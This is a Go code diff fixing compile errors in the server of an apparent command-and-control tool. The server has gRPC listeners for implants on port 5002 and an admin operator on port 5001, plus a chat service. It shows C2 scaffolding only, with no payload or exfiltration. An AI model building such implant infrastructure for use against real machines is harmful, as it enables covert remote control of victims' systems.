@@ -12,14 +12,14 @@ import (
 
 func main(){
   var (
-    implantListener,adminListener net.Listen
+    implantListener,adminListener net.Listener
     err error
-    opts []stream.ServerOption
+    opts []grpc.ServerOption
     work,output chan *stream.Command
   )
   //initialize a work channels for commands
   work,output = make(chan *stream.Command),make(chan *stream.Command)
-  implant := stream.NewImplantClient(work,output)
+  implant := stream.NewImplantServer(work,output)
   admin := stream.NewAdminServer(work, output)
   //start implant listener
   if implantListener,err = net.Listen("tcp",fmt.Sprintf(":%d",5002)); err != nil{
@@ -29,7 +29,8 @@ func main(){
   if adminListener,err = net.Listen("tcp",fmt.Sprintf(":%d",5001)); err != nil{
     log.Fatalf("[-]   Failed to start admin listener: %v",err)
   }
-  if chatListener,err := net.Listen("tcp",fmt.Sprintf(":%d",5003)); err != nil{
+  chatListener,err := net.Listen("tcp",fmt.Sprintf(":%d",5003))
+  if err != nil{
     log.Fatalf("[-] Failed to start chat server: %v",err)
   }
   s := stream.ChatServer{}
@@ -37,7 +38,7 @@ func main(){
   grpcAdminServer,grpcImplantServer := grpc.NewServer(opts...),grpc.NewServer(opts...)
   stream.RegisterImplantServer(grpcImplantServer,implant)
   stream.RegisterAdminServer(grpcAdminServer,admin)
-  stream.RegisterChatServiceServer(grpcChatServer,s) //probaly use & at s
+  stream.RegisterChatServiceServer(grpcChatServer,&s) //probaly use & at s
   go func(){
     grpcImplantServer.Serve(implantListener)
   }()
